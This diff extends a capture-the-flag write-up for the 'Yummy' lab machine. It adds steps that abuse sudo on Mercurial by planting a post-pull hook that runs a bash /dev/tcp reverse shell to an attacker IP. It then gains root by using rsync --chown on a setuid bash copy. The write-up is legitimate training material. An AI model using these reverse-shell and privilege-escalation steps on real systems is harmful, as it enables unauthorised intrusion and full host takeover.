@@ -1,3 +1,9 @@
+> [!Note]
+>
+> |User|Root|
+> |---|---|
+> |✅|✅|
+
 ![image](https://github.com/user-attachments/assets/abfb1789-0846-443a-bd89-64da26241e02)
 
 
@@ -822,4 +828,160 @@ qa@yummy:~$ hostname
 yummy
 qa@yummy:~$ cat user.txt
 14a7f43260d0074218437a9a6cf2a657
+```
+
+## 8. Lateral movement to `dev`
+
+### 8.1. Exploring hg SCM
+
+`qa` is able to run `/usr/bin/hg ` as `dev`
+
+```console
+qa@yummy:~$ sudo -l
+[sudo] password for qa:
+Matching Defaults entries for qa on localhost:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User qa may run the following commands on localhost:
+    (dev : dev) /usr/bin/hg pull /home/dev/app-production/
+```
+
+From the `pull` command, hg should like be a source code management software
+
+The `hg` utility uses a config file `hgrc` (https://www.selenic.com/mercurial/hgrc.5.html)
+
+`/home/qa/.hgrc`:
+
+```sh
+# example user config (see 'hg help config' for more info)
+[ui]
+# name and email, e.g.
+# username = Jane Doe <jdoe@example.com>
+username = qa
+
+# We recommend enabling tweakdefaults to get slight improvements to
+# the UI over time. Make sure to set HGPLAIN in the environment when
+# writing scripts!
+# tweakdefaults = True
+
+# uncomment to disable color in command output
+# (see 'hg help color' for details)
+# color = never
+
+# uncomment to disable command output pagination
+# (see 'hg help pager' for details)
+# paginate = never
+
+[extensions]
+# uncomment the lines below to enable some popular extensions
+# (see 'hg help extensions' for more info)
+#
+# histedit =
+# rebase =
+# uncommit =
+[trusted]
+users = qa, dev
+groups = qa, dev
+```
+
+hgrc supports [hooks](https://wiki.mercurial-scm.org/Hook) to run commands after a `pull` is completed
+
+### 8.2. Lateral movement to `dev`
+
+Setup reverse shell script:
+
+```sh
+cat << EOF > /dev/shm/shell
+#!/bin/bash
+bash -i >& /dev/tcp/10.10.14.20/4446 0>&1
+EOF
+chmod 777 /dev/shm/shell
+```
+
+Plant a hook to run the reverse shell script:
+
+```sh
+cat << EOF >> .hgrc
+[hooks]
+post-pull = /dev/shm/shell
+EOF
+```
+
+Start listener in Kali
+
+```sh
+rlwrap nc -nlvp 4446
+```
+
+Prepare hg folder and execute the sudo hg command
+
+```console
+qa@yummy:~$ mkdir /dev/shm/.hg && cd $_
+qa@yummy:/dev/shm/.hg$ chmod 777 /dev/shm/.hg
+qa@yummy:/dev/shm/.hg$ cp /home/qa/.hgrc /dev/shm/.hg/hgrc
+qa@yummy:/dev/shm/.hg$ sudo -u dev /usr/bin/hg pull /home/dev/app-production/
+pulling from /home/dev/app-production/
+requesting all changes
+adding changesets
+adding manifests
+adding file changes
+added 6 changesets with 129 changes to 124 files
+new changesets f54c91c7fae8:6c59496d5251
+(run 'hg update' to get a working copy)
+```
+
+Reverse shell hooked:
+
+```console
+connect to [10.10.14.20] from (UNKNOWN) [10.10.11.36] 48966
+I'm out of office until January 12th, don't call me
+dev@yummy:/dev/shm$ id
+id
+uid=1000(dev) gid=1000(dev) groups=1000(dev)
+```
+
+### 8.3 Privilege escalation
+
+`dev` is able to run `rsync` as `root` without password, to copy all files from `/home/dev/app-production/` (except `.hg`) to `/opt/app/`
+
+```console
+dev@yummy:/dev/shm$ sudo -l
+sudo -l
+Matching Defaults entries for dev on localhost:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User dev may run the following commands on localhost:
+    (root : root) NOPASSWD: /usr/bin/rsync -a --exclude\=.hg /home/dev/app-production/* /opt/app/
+```
+
+`rsync` supports `--chown` option to change ownership, let's attempt to use this to get root execution
+
+Copy `bash` to `/home/dev/app-production/`
+
+```sh
+cp /bin/bash /home/dev/app-production/bash
+```
+
+Use **setuid** to enforces user ownership on `/home/dev/app-production/bash`. When it is set, the file will execute with the file owner's user ID, not the person running it.
+
+By setting this then subsquently running rsync to set the owner as root, `bash` will then be run as `root` no matter which use runs it
+
+```sh
+chmod u+s /home/dev/app-production/bash
+```
+
+Execute `rync`:
+
+```sh
+sudo /usr/bin/rsync -a --exclude=.hg /home/dev/app-production/* --chown root:root /opt/app/
+```
+
+Get root:
+
+```console
+dev@yummy:/dev/shm$ /opt/app/bash -p
+id
+uid=1000(dev) gid=1000(dev) euid=0(root) groups=1000(dev)
+cat /root/root.txt
+89a24b6f460495f156d88ffb0cf7a0ba
 ```
